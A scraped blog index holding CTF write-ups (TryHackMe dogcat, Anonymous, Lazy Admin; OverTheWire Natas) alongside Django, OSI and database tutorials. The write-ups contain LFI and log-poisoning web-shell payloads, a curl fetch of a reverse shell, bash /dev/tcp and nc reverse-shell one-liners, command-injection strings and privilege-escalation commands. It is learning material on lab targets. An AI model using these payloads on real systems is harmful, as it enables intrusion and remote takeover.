(Debian)|_http-title: dogcatNothing fancy here, there’s a web server running on port 80, let’s check it! Basically, it’s a web app that choose randomly a cat or a dog image based on user choice (images are stored inside a dog and cat folders - look at the source). The user choice (cat | dog) are passed to the server through the view variable (look at the url), so what if we enter something other than dog or cat ? for example ls Sorry, only dogs or cats are allowed. So only dogs or cats allowed ? lets try dog;ls ? Warning: include(dog;ls. php): failed to open stream: No such file or directory in /var/www/html/index. php on line 24Warning: include(): Failed opening 'dog;ls. php' for inclusion (include_path='. :/usr/local/lib/php') in /var/www/html/index. php on line 24humm ! so there’s an include function running inside the /var/www/html/index. php file that failed to open days;ls. php file. I think it’s time for some lfi now ! First things first, I used the null byte character : %00The result was : Warning: include(): Failed opening 'dog;ls' for inclusion (include_path='. :/usr/local/lib/php') in /var/www/html/index. php on line 24so we get rid of the first warning which means that :  the program concatenate . php extension at the end of the input unless it’s dog or cat. Ok, let’s directory traversal : “/?view=php://filter/read=convert. base64-encode/resource=. /dog/. . /index”Result after decoding : &lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;dogcat&lt;/title&gt;  &lt;link rel= stylesheet  type= text/css  href= /style. css &gt;&lt;/head&gt;&lt;body&gt;  &lt;h1&gt;dogcat&lt;/h1&gt;  &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;  &lt;div&gt;    &lt;h2&gt;What would you like to see?&lt;/h2&gt;    &lt;a href= /?view=dog &gt;&lt;button id= dog &gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href= /?view=cat &gt;&lt;button id= cat &gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;    &lt;?php      function containsStr($str, $substr) {        return strpos($str, $substr) !== false;      }     &lt;!-- the site checks if ext variable is set, if not it assigns it . php  --&gt;	  $ext = isset($_GET[ ext ]) ? $_GET[ ext ] : '. php';      if(isset($_GET['view'])) {        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {          echo 'Here you go!';          include $_GET['view'] . $ext;        } else {          echo 'Sorry, only dogs or cats are allowed. ';        }      }    ?&gt;  &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;html comment is my explanation of the code. LFI to RCE via controlled log file: Like mentioned here, I did a request to the server (in our case Apache) and include the log file (/var/log/apache2/access. log&amp;ext). Reading the log file, it looks like we can insert a php script inside the user agent header since it’s not manipulated(10. 4. 14. 245 - - [14/Nov/2020:17:13:34 +0000] “GET / HTTP/1. 1” 200 537 “-“ “Mozilla/5. 0 (X11; Linux x86_64; rv:68. 0) Gecko/20100101 Firefox/68. 0” 10. 4. 14. 245 -), so I inserted this code : &lt;?php system($_GET['cmd']);?&gt;and then started a web server on my local host to host a reverse shell file and used wget command to save it inside a temporary file to finally get a reverse shell ! /?view=. /dog/. . /. . /. . /. . /. . /. . /. . /var/log/apache2/access. log&amp;ext&amp;cmd=curl http://MY-IP:80/reverse. php &gt; /tmp/reverse. phpAfter that, I used chmod to make it executable and started a listener in my local host and running the file from the browserBOOM!! I got the reverse shell ! root@kali:~/Documents/thm/startup# nc -nlvp 1234listening on [any] 1234 . . . connect to [10. 4. 14. 245] from (UNKNOWN) [10. 10. 129. 131] 46518Linux 571f0aa7aca9 4. 15. 0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux 18:05:41 up 55 min, 0 users, load average: 0. 23, 0. 11, 0. 06USER   TTY   FROM       LOGIN@  IDLE  JCPU  PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ Spawning a tty shell using /bin/bash -i command, and looking at the user directory we can find the 2nd flag. The first flag was inside the /var/www/html/ directory. (We could retrieve it by running view=flag in the url, anyway)Now we need to escalate our privileges. PrivEsc: Running sudo -l command, it looks like we can env as root, checking [gtfobins] as always and yeah we can escalate our privileges to root by running :sudo env /bin/sh, easy!We can now retrieve the 3rd flag from root directory. But now !! THE FUN BEGIN Breaking DOCKER LOCKER: The 4th flag was really hard to get for me, I didn’t face any of these kinda flags before but it was kinda fun to get it ! By looking at this article from the famous Vickie Lie, and the docker tag from the room cover, I check /proc/1/cgroup file to check if we are inside a docker container or not. So I manually enumerated the machine, looking for elements that could help me escape the container such as a script via the find / -type f -name *. sh command because nothing of the tricks found helped me, the first result is the file /opt/backups/backup. sh, hum interesting, looking at its contents : #!/bin/bashtar cf /root/container/backup/backup. tar /root/containerFrom what it looks like, basically it’s a cronjob that backup the container, and since it’s writeable, let’s add a reverse shell, start a listener and wait for it to be executed. echo  /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/1234 0&gt;&amp;1'  &gt;&gt; backup. shAfter few minutes we get a reverse shell from the parent host and we can easily get flag4. txt ! Final thoughts: This room rocks ! I absolutely recommend for all beginners like me ! Huge thanks to jammy ! "
    }, {
    "id": 35,
    "url": "/Placeholder-Image-Server-Adding-Caching/",
    "title": "Placeholder Image Server : Adding Caching",
    "body": "2020/11/13 - Previous Post : Placeholder Image Server : Views  To cache something is to save the result of an expensive calculation so that you don’t have to perform the calculation next time. To better understanding what is caching, check this. In our new view. py file, a cache key generated that depends on the width, height, and image format. Before a new image is created, the cache is checked to see if the image is already stored. When there is a cache miss and a new image is created, the image is cached using the key for an hour. Content of the new views. py file will be : from django. shortcuts import renderfrom django. http import HttpResponse,HttpResponseBadRequestfrom django import formsfrom django. conf. urls import urlfrom io import BytesIOfrom PIL import Image, ImageDraw# importing the cache modulefrom django. core. cache import cache class ImageForm(forms. Form):  height = forms. IntegerField(min_value=1,max_value=2000)  width = forms. IntegerField(min_value=1,max_value=2000)  def generate(self,image_format='PNG'):    height = self. cleaned_data['height']    width = self. cleaned_data['width']    #generating a key based on width, height and image_format    key = '{}. {}. {}'. format(width,height,image_format)    #checking if we have key in the cache    content = cache. get(key)     if content is None : # if there's no key cacked :      #generate a new image with RGB mode      image = Image. new('RGB', (width,height))        #Adding sizing information using Pillow         draw = ImageDraw. Draw(image)            #format is used to replace brackets with values      text = '{} X {}'. format(width,height)       textwidth, textheight = draw. textsize(text)           #test if the text fit well in the image, if not we don't print it      if textwidth &lt; width and textheight &lt; height :         texttop = (height - textheight) // 2        textleft = (width - textwidth) // 2        draw. text((textleft,texttop),text,fill=(255,255,255))                  #converting the image into bytes      content = BytesIO()       image. save(content, image_format)      content. seek(0)      cache. set(key,content, 60*60) # set the key for 1 hour    return contentdef index(request):  return HttpResponse('index')def placeholder(request, width, height):  form = ImageForm({'height':height,'width':width})  if form. is_valid():    image = form. generate()    return HttpResponse(image, content_type='/image/png')   else:    return HttpResponseBadRequest('Invalid image request')Django defaults to using a process-local, in-memory cache, but you could use a different backend such as Memcached or the file system by configuring the CACHES setting. "
    }, {
    "id": 36,
    "url": "/Placeholder-Image-Server-Views/",
    "title": "Placeholder Image Server : Views",
    "body": "2020/11/12 - Previous Post : Placeholder Image Server : First Steps After configuring the url patterns, now we need to make the view.    Though the regular expression will ensure that the height and width consist of digits, they will be passed to the view as strings. The view will need to convert them and may also want to validate that they are a manageable size. We can easily do this by validating user input with Django Forms. Typically forms are used to validate POST an GET content, but they can also be used to validate particular values from the URL, and if the form isn’t valid, the view will send an error response to the vlient using HttpResponse subclass : HttpResponseBadRequest and sends a 400 Bad Request response.     After validating the height and width, now we need to generate the image using Pillow module (from PIL import Image) and convert it to bytes using io module (from io import BytesIO). Once the image has been validated, the view successfully returns the PNG image for the requested width an height.     However, an all-black image, with no sizing information, is not a very stylish or useful placeholder. With Pillow we can add this text to the image using the ImageDraw module.  Here is the final result of views. py : from django. shortcuts import renderfrom django. http import HttpResponse,HttpResponseBadRequestfrom django import formsfrom django. conf. urls import urlfrom io import BytesIOfrom PIL import Image, ImageDrawclass ImageForm(forms. Form):  height = forms. IntegerField(min_value=1,max_value=2000)  width = forms. IntegerField(min_value=1,max_value=2000)  def generate(self,image_format='PNG'):    height = self. cleaned_data['height']    width = self. cleaned_data['width']    #generate a new image with RGB mode    image = Image. new('RGB', (width,height))      #Adding sizing information using Pillow       draw = ImageDraw. Draw(image)        #format is used to replace brackets with values    text = '{} X {}'. format(width,height)     textwidth, textheight = draw. textsize(text)       #test if the text fit well in the image, if not we don't print it    if textwidth &lt; width and textheight &lt; height :       texttop = (height - textheight) // 2      textleft = (width - textwidth) // 2      draw. text((textleft,texttop),text,fill=(255,255,255))            #converting the image into bytes    content = BytesIO()     image. save(content, image_format)    content. seek(0)    return contentdef index(request):  return HttpResponse('index')def placeholder(request, width, height):  form = ImageForm({'height':height,'width':width})  if form. is_valid():    image = form. generate()    return HttpResponse(image, content_type='/image/png')   else:    return HttpResponseBadRequest('Invalid image request')"
    }, {
    "id": 37,
    "url": "/placeholder_image_server/",
    "title": "Placeholder Image Server : First Steps",
    "body": "2020/11/04 - In 2005, Django was originally developed at World Online in Lawrence, Kansas, as a way for reporters to quickly create content for the Web. Since then, it has been used by publishing organizations such as the Washington Post, the Guardian, PolitiFact, and the Onion. This aspect of Django may give the impression that its main purpose is content publishing, or that Django itself is a content management system. With large organizations such as NASA adopting Django as their framework of choice, however, Django has obviously outgrown its original purpose. Why Stateless ?: HTTP itself is a stateless protocol, meaning each erequest that comes to the server is independent of the previous request. If a particular state is needed, it has to be added at the application layer. Frameworks like Django uses cookies and other mechanisms to tie together requests made by the same client. Along with a persistent session stire on the server, the application can then handle tasks, such as holding user authentication across requests. With that comes a number of challenges, as this consistent state reads, and potentially writes, on every request in a distributed server architecture. As you can imagine, a stateless application does not maintain this consistent state on a server. If authentication or other user credentials are required, then they must be passed by the client on every request. Placeholder Image Server | INTRODUCTION: Placeholder images are frequently used in application prototypes, example projects or testing environment. A typical placeholder image service will take a URL that indicates the size of the image and generate that image. The URL may contain additional information, such as the color of the image or text to display within the image. Since everything that is needed to construct the requested image is contained withing the URL, and there’s little need for authentication, this makes a good candidate for a stateless application. First Steps: First, we need to create our project using django-admin startproject command, migrate our new configurations and then start a new app using python3 manage. py startapp placeholder. seifallah@seifallah-Aspire-E5-573:~/Documents/Django$ tree chapter2/chapter2/├── chapter2│   ├── asgi. py│   ├── __init__. py│   ├── __pycache__│   │   ├── __init__. cpython-36. pyc│   │   ├── settings. cpython-36. pyc│   │   └── urls. cpython-36. pyc│   ├── settings. py│   ├── urls. py│   └── wsgi. py├── db. sqlite3├── manage. py└── placeholder  ├── admin. py  ├── apps. py  ├── __init__. py  ├── migrations  │   └── __init__. py  ├── models. py  ├── tests. py  ├── urls. py  └── views. py4 directories, 18 filesNow we need to edit our files, first let’s write the first view : #index viewdef index(request):  return HttpResponse('index')#placeholder viewdef placeholder(request, width, height):  return HttpResponse('Ok')To call this view, we need to map it to a URL and for this we need URLConf. We created a file called urls. py inside our app folder : from django. urls import path, re_path #re_path stands for regex pathfrom . import viewsurlpatterns = [  path('',views. index, name='index'),# The stub of the placeholder view will take two arguments: width and height. # As mentioned previously, those parameters will be captured by the URL and passed to the view. # URL patters in Django can use regular expressions to match the incoming URL so we'll use re_path.    re_path(r'^image/(?P&lt;width&gt;[0-9]+)*(?P&lt;height&gt;[0-9]+)/$', placeholder, name='placeholder'),]The next step is to point the root URLconf at the placeholder. urls module in our site urls. py. path('placeholder/', include('placeholder. urls') ),  With these patterns in place, incoming requests to the URL /image/30x25 for example will be routed the placeholder view and pass in those values (e. g width=30 and height=25). "
    }, {
    "id": 38,
    "url": "/OSI-Model/",
    "title": "OSI Model - Crash Course",
    "body": "2020/11/02 - OSI (Open Systems Interconnection): The OSI (Open Systems Interconnection) Model is a standardized model which we use to demonstrate the theory behind computer networking. In practice, it’s actually the more compact TCP/IP model that real-world networking is based off; however the OSI model, in many ways, is easier to get an initial understanding from. The OSI Model consists of seven layers : | OSI MODEL  ||--------------|| Application || Presentation || Session   || Transport  || Network   || Data Link  || Physical   |Layer 7 – Application: The application layer of the OSI model essentially provides networking options to programs running on a computer. It works almost exclusively with applications, providing an interface for them to use in order to transmit data. When data is given to the application layer, it is passed down into the presentation layer. Layer 6 – Presentation: The presentation layer receives data from the application layer. This data tends to be in a format that the application understands, but it’s not necessarily in a standardized format that could be understood by the application layer in the receiving computer. The presentation layer translates the data into a standardized format, as well as handling any encryption, compression or other transformations to the data. With this complete, the data is passed down to the session layer. Layer 5 – Session: When the session layer receives the correctly formatted data from the presentation layer, it looks to see if it can set uo a connection with the other computer across the network. It it can’t then it sends back an error and the process goes no further. If a session can be established then it’s the job of the session layer to maintain it, as well as co-operate with the session layer of the remote computer in order to synchronize communications. This is what allows you to make multiple requests to different endpoints simultaneously without all the data getting mixed up. When the session layer has successfully logged a connection between the host and remote computer, the data is passed down to Layer 4 : The transport Layer Layer 4 – Transport: The transport layer is a very interesting layer that serves numerous important functions. Its first purpose is to choose the protocol over which the data is to be transmitted. The two most common protocols in the transport layer are TCP (Transmission Control Protocol) and UDP (User Datagram Protocol); with TCP the transmission is connection-based which means that a connection between the computers is established and maintained for the duration of the request. This allows for a reliable transmission, as the connection can be used to ensure that the data is sent at an acceptable speed, and that any lost data is re-sent. With UDP, the opposite is true; packets of data are essentially throwing at the receiving computer. With a protocol selected, the transport layer then divides the transmission up unto bite-sized pieces (over TCP these are called segments, over UDP they’re called datagrams), which makes it easier to transmit the message successfully. Layer 3 – Network: The network layer is responsible for locating the destination of your request. For example, the Internet is a huge network; when you want to request information from a webpage, it’s the network layer that takes the IP address for the page and figures out the best route to take. At this stage we’re working with what is referred to as Logical addressing (i. e. IP addresses) which are still software controlled. Logical addresses are used to provide order to networks, categorizing them and allowing us to properly sort them. Currently the most common form of logical addressing is the IPV4 format, which you’ll likely already be familiar with. Layer 2 – Data Link: The data link layer focuses on the physical addressing of the transmission. It receives a packet from the network layer (that includes the IP address for the remote computer) and adds in the physical (MAC) address of the receiving endpoint. Inside every network enabled computer is a Network Interface Card (NIC) which comes with a unique MAC (Media Access Control) address to identify it. MAC addresses are set by the manufacturer and literally burnt into the card; they can’t be changer – although the can be spoofed. When information is sent across a network, it’s actually the physical address that is used to identify where exactly to send the information. Additionally, it’s also the job of the data link layer to present the data in a format suitable for transmission. The data link layer also serves an important function when it receives data, as it checks the received information to make sure that it hasn’t been corrupted during transmission, which could well happen when the data is transmitted by layer 1: the physical layer. Layer 1 – Physical: The physical layer is right down to the hardware of the computer. This is where the electrical pulses that make up data transfer over a network are sent and received. It’s the job if the physical layer to convert the binary data of the transmit them across the network, as well as receiving incoming signals and converting them back into binary data. Now it’s time for a Q/A :  Which layer would choose to send data over TCP or UDP ? Click to view answer !Layer 4 : Transport Which layer Checks received packets to make sure that they haven’t been corrupted ? Click to view answer !Layer 2 : Data Link In which layer would data be formatted in preparation for transmission ? Click to view answer !Layer 2 : Data Link Which layer transmits and receives data ? Click to view answer !Layer 4 : Physical Which layer encrypts, compresses, or otherwise transforms the initial data to give it a standardized format ? Click to view answer !Layer 6: Presentation Which layer tracks communications between the host and receiving computers ? Click to view answer !Layer 5 : Session Which layer accepts communication requests from applications ? Click to view answer !Layer 7 : Application Which layer handles logical addressing ? Click to view answer !Layer 3 : Network When sending data over TCP, what would you call the “bite-sized” pieces of data? Click to view answer !Segments"
    }, {
    "id": 39,
    "url": "/The-World's-Smallest-Django-Project/",
    "title": "The World's Smallest Django Project",
    "body": "2020/10/31 - Brief Introduction:    What is Django ? Django is a high-level Python web framework that enables rapid development of secure and maintainable websites.    Why Django ? Django helps you write software that is :  Complete Versatile Secure Scalable Maintainable Portable“Hello World !” Project: Building a ‘Hello World’ example in a new language or framework is a common first project. (I will assume that you have Django installed. If not, follow this link. ) import sysfrom django. http import HttpResponsefrom django. conf. urls import url from django. conf import settings# Creating The View# Django is referred to as a model-template-view (MTV) framework. The view portion typically inspects the incoming HTTP request and queries, ir constructs, the necessary data to send to the presentation layer. def index(request):  return HttpResponse('Hello World')# URL Patterns# In order to tie our view into the site's structure, we'll need to associate it with a URL pattern. urlpatterns = (  url(r'^$', index), )# Configuration # Django settings detail everything from database and cache connections to internationalization features and static and uploaded resources. settings. configure(  DEBUG=True, # Debugging mode  SECRET_kEY='THISISTHESECRETKEY', # Secret key must be generated for the default session and cross-site request forgery (CSRF) protection.   ROOT_URLCONF=__name__,   MIDDLEWARE_CLASSES=(    'django. middleware. common. CommonMiddleware',    'django. middleware. csrf. CsrfViewMiddleware',    'django. middleware. clickjacking. XFrameOptionsMiddleware',  ),)if __name__ ==  __main__ :  from django. core. management import execute_from_command_line  execute_from_command_line(sys. argv)Now we can start the example in the command line: hostname $ python hello. py runserverPerforming system checks. . . System check identified no issues (0 silenced). October 31, 2020 - 18:21:44Django version 1. 11. 23, using settings NoneStarting development server at http://127. 0. 0. 1:8000/Quit the server with CONTROL-C. "
    }, {
    "id": 40,
    "url": "/Over-The-Wire-Natas/",
    "title": "OverTheWire - Natas : 11 Levels",
    "body": "2020/10/24 - Level 1: View Source. PASSWORD 1 : gtVrDuiDfck831PqWsLEZy5gyDz1clto Level 2: View Source. PASSWORD 2 : ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi Level 3: . . /files/users. txtPASSWORD 3 : sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 Level 4: robots. txtPASSWORD 4 : Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ Level 5: Here we need to set the referer header to : “http://natas5. natas. labs. overthewire. org/” to get the password. PASSWORD 5 : iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq Level 6: We need to change the logged cookie value from 0 to 1 to get the password. PASSWORD 6 : aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 Level 7: The php script checks the secret included in secret. inc file with the secret typed in the form, checking this file we could find the secret : FOEIUWGHFEEUHOFUOIUPASSWORD 7 : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 Level 8: URL. PASSWORD 8 : DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe Level 9: Reversing the encoded secret : Hex -&gt; Reverse -&gt; Base64Secret : oubWYf2kBqPASSWORD 9 : W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl Level 10: Command injection. ;cat . . /. . /. . /. . /etc/natas_webpass/natas10PASSWORD 10 : nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu Level 11: This level was quite interesting, first I tried encoding this command ;cat . . /. . /. . /. . /etc/natas_webpass/natas11 but it didn’t work, I took a look to the source code again if(preg_match('/[;|&amp;]/',$key)) {So it allows the slash, that means we could insert the file location with no problem, good! grep -i $key dictionary. txt(-i means case insensitive) Basically, this command search for $key in dictionary. txt, and we can insert our file location with no problem, What if we search for something in our file (I absolutely means /etc/natas_webpass/natas11) ? let’s search for z for example ! Our payload will look like : z /etc/natas_webpass/natas11Bingo ! Here’s the password : U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK "
    }, {
    "id": 41,
    "url": "/THM-Anonymous/",
    "title": "TryHackMe: Anonymous WriteUp",
    "body": "2020/10/22 - Welcome, Welcome, Welcome and Welcome ! This is a WriteUp for the anonymous room. I Had a lot of fun solving it and I absolutely recommend it. Enumeration: Discovered open port 21/tcp on 10. 10. 9. 178Discovered open port 445/tcp on 10. 10. 9. 178Discovered open port 139/tcp on 10. 10. 9. 178Discovered open port 22/tcp on 10. 10. 9. 178I couldn’t answer the 4th question using the nmap output, so I started enumerating the ftp server which was allowing the anonymous login, and I found some files inside a directory called scripts : -rwxr-xrwx  1 1000   1000     314 Jun 04 19:24 clean. sh-rw-rw-r--  1 1000   1000     1505 Oct 22 19:45 removed_files. log-rw-r--r--  1 1000   1000      68 May 12 03:50 to_do. txtThe clean. sh script looks like it deletes any files inside the /tmp directory : #!/bin/bashtmp_files=0echo $tmp_filesif [ $tmp_files=0 ]then    echo  Running cleanup script: nothing to delete  &gt;&gt; /var/ftp/scripts/removed_files. logelse  for LINE in $tmp_files; do    rm -rf /tmp/$LINE &amp;&amp; echo  $(date) | Removed file /tmp/$LINE  &gt;&gt; /var/ftp/scripts/removed_files. log;donefiThe removed_files. log file was filled with : Running cleanup script: nothing to deleteThe to_do. txt was just telling that he needs to disable the ftp anonymous login. So after enumerating the ftp server, let’s go back and check the smb; but before that let’s explain what is smb: SMB stands for sever message block. It’s a protocol for sharing resources like files, printers, in general any resource which should be retrievable or made available by the server. It primarily runs on port 445 or port 139 depending on the server . It is actually natively available in windows, so windows users don’t need to configure anything extra as such besides basic setting up. In linux however ,it is a little different. To make it work for linux, you need to install a samba server because linux natively does not use SMB protocol. First security flaw in the SMB is using default credentials or easily guessable and sometimes no authentication at all. The second flaw is the samba server which is extremely vulnerable. Ok ,so how do we enumerate when we find that in our nmap scan port 445 is open with samba server on. I only said samba server because linux is predominantly used by enterprises , around 75% to be precise. That being said, the process of enumeration for SMB is the same for both linux and windows with the exception that in linux , you have to check the samba version as well and check if it is vulnerable or not. I ran nmap -sC -p 139,445 -sV 10. 10. 192. 43 to know which Samba version is running; 4. 7. 6After that I ran smbmap to enumerate the Samba server. root@kali:~/Documents/thm/anonymous# smbmap -H 10. 10. 192. 43 -R[+] Finding open SMB ports. . . . [+] Guest SMB session established on 10. 10. 192. 43. . . [+] IP: 10. 10. 192. 43:445    Name: 10. 10. 192. 43                       Disk                          Permissions   Comment    ----                          -----------   -------    print$                         NO ACCESS    Printer Drivers    .                              dr--r--r--        0 Sun May 17 11:11:34 2020  .     dr--r--r--        0 Thu May 14 01:59:10 2020  . .     fr--r--r--      42663 Tue May 12 00:43:42 2020  corgo2. jpg    fr--r--r--      265188 Tue May 12 00:43:42 2020  puppos. jpeg    pics                          READ ONLY    My SMB Share Directory for Pics    . \    dr--r--r--        0 Sun May 17 11:11:34 2020  .     dr--r--r--        0 Thu May 14 01:59:10 2020  . .     -r--r--r--      42663 Tue May 12 00:43:42 2020  corgo2. jpg    -r--r--r--      265188 Tue May 12 00:43:42 2020  puppos. jpeg    IPC$                          NO ACCESS    IPC Service (anonymous server (Samba, Ubuntu))-H stands for host and -R stands for recursive switch to list all the files. Answering Question 4 : The share on the user’s computer is Pics. Now you can actually retrieve the files using smbmap as well, I’ll leave that as an exercise. But what if we wanted a full fledged command prompt like a ftp prompt? That’s very much possible with smbclient. Lets try to do that. root@kali:~/Documents/thm/anonymous# smbclient \\\\10. 10. 192. 43\\picsEnter WORKGROUP\seifallah's password: Try  help  to get a list of possible commands. smb: \&gt; ls .                  D    0 Sun May 17 11:11:34 2020 . .                  D    0 Thu May 14 01:59:10 2020 corgo2. jpg             N  42663 Tue May 12 00:43:42 2020 puppos. jpeg             N  265188 Tue May 12 00:43:42 2020        20508240 blocks of size 1024. 13306812 blocks availableI used get command to get the images, nothing special about some poppies pics. I used binwalk and strings but I found nothing. User Flag: So I went back to the ftp server, and took a look again to clean. sh file, and since it’s executable and writable, I used it to make a reverse shell; script from pentestmonkey. bash -i &gt;&amp; /dev/tcp/10. 4. 14. 245/1234 0&gt;&amp;1Then I started my local listener, upload the new file using put command and waited some seconds for the cronjob to be executed. ftp&gt; put clean. sh local: clean. sh remote: clean. sh200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 359 bytes sent in 0. 00 secs (4. 5649 MB/s)And boom! we got the reverse shell, easy ! root@kali:~# nc -nlvp 1234listening on [any] 1234 . . . connect to [10. 4. 14. 245] from (UNKNOWN) [10. 10. 146. 152] 55120bash: cannot set terminal process group (1241): Inappropriate ioctl for devicebash: no job control in this shellnamelessone@anonymous:~$ I found the user. txt file in the powered directory. Now I need some PrivEsc. PrivEsc: Using the hint : This may require you to do some outside research first thing came into my mind is SUID files find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null looking at the output, we could use env file. Using GTFObins, here’s the result : namelessone@anonymous:~$ /usr/bin/env /bin/bash -p/usr/bin/env /bin/bash -plspicsuser. txtwhoamirootNow easily run this command to get the root. txt file. cat /root/root. txt"
    }, {
    "id": 42,
    "url": "/THM-Lazy-Admin/",
    "title": "TryHackMe: Lazy Admin",
    "body": "2020/10/15 - Room Link : Lazy Admin Introduction: ‘Lazy Admin’ is an easy room made by MrSeth6797, great for practice challenges. Let’s get started! Enumeration: Starting Nmap with the -A flag, here’s the output : PORT  STATE SERVICE REASON     VERSION22/tcp open ssh   syn-ack ttl 61 OpenSSH 7. 2p2 Ubuntu 4ubuntu2. 8 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB|  256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=|  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm80/tcp open http  syn-ack ttl 61 Apache httpd 2. 4. 18 ((Ubuntu))| http-methods: |_ Supported Methods: HEAD POST OPTIONS|_http-server-header: Apache/2. 4. 18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksExamining the source code of the running web service looking for some creds, found nothing. So I fire up gobuster using the directory-list-2. 3-medium. txt wordlist and found a subdirectory called /content : Found out that “Basic-CMS Sweetrice” is running here, firing up gobuster again and adding /content to the URI and here’s the result: Did some research about this CMS and found that the 1. 5. 1 version suffers from a code execution vulnerability via the use of a cross site request forgery flaw. Check this link : SweetRice-1. 5. 1-Code-ExecutionSo basically, this means that I can upload a php reverse shell and execute it but first we need some credentials to login and then upload our file, so we need more enumeration. I examine the other subdirectories and there’s a specific file that got my attention : /content/inc/mysql_backup/mysql_backup/mysql_bakup_20191129023059-1. 5. 1. sql ! Examining it carefully, I found a username and a password hash (line 79). The password hash type is MD5, I used hydra to crack it using the rockyou. txt wordlist and then logged in the Sweetrice CMS, easy hein ? User Flag: To get the reverse shell, I simply started my listener (nc -nlvp 1234) and then copied the /usr/share/webshells/php/php-reverse-shell. php file inside the ads section, save it and run it as mentionad in the script above. and boom! got the reverse shell ! listening on [any] 1234 . . . connect to [10. 2. 36. 150] from (UNKNOWN) [10. 10. 217. 36] 56240Linux THM-Chal 4. 15. 0-70-generic #79~16. 04. 1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux 18:01:47 up 5 min, 0 users, load average: 1. 37, 2. 14, 1. 05USER   TTY   FROM       LOGIN@  IDLE  JCPU  PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ whoamiwww-data$ This time, I was lucky by opening the user. txt file without any privelage escalation, and yeah it works ! $ cd /home$ lsitguy$ cd itguy$ cat user. txtTHM{#####################}Root Flag: Now we need to find a way to get the root flag !First of all, I ran sudo -l command : $ sudo -l Matching Defaults entries for www-data on THM-Chal:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser www-data may run the following commands on THM-Chal:  (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup. pl$ Well, the user www-data can run the following command ? let’s open the backup. pl file ! $ cat /home/itguy/backup. pl#!/usr/bin/perlsystem( sh ,  /etc/copy. sh );hum ! can we edit the copy. sh file so it gets executed as root ? $ ls -al /etc/copy. sh-rw-r--rwx 1 root root 81 Nov 29 2019 /etc/copy. shand yeah we can edit it, SUPER ! So the first idea tha came in my mind is to get an another reverse shell using this command : $ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc \&lt;local-ip\&gt; 5554 \&gt;/tmp/f' \&gt;/etc/copy. shAfter setting up the listener and ran the command, I got the root shell ! now it’s time the get root flag !! :) finally ! root@kali:~# nc -nlvp 5554listening on [any] 5554 . . . connect to [10. 2. 36. 150] from (UNKNOWN) [10. 10. 217. 36] 51512/bin/sh: 0: can't access tty; job control turned off# cat /root/root. txtCongrats, now you pissed off the lazy admin ! "
    }, {
    "id": 43,
    "url": "/Databases-Introduction/",
    "title": "Databases - Introduction",
    "body": "2020/10/14 - When do we actually need a Database ? : You have some data, and you want to store them, but you are not sure if you need to use a database or a spreadsheet for example, so if you answer by yes to any of the following characters, yeah you need a database !  Size : If you got big chunks of data like thousands of raws of customers, you basically need a database.  Accuracy : You care about your data being correct ? Security : Are your data valuable and sensitive ? Redundancy : No one wants redundant data ! Importance : Imagine like someone deleted your spreadsheet file that stores all your patients data ? I know you can’t imagine ! Overwriting : How about having more than one person overwriting the same data at the same time ?If you answer “Yes” to any of these problems, you actually need a database. Database Management Systems : Database contains Data, easy. But how we manage these Data ? Using something called Database Managemenet systems like Oracle, MySQL, SQL Server, MongoDB. Remember that those aren’t databases, those are softwares that surrounds and manages your actual data, and it enforces some rules that you specify on your data like the type of the data for example. There are different DBMS, and they are 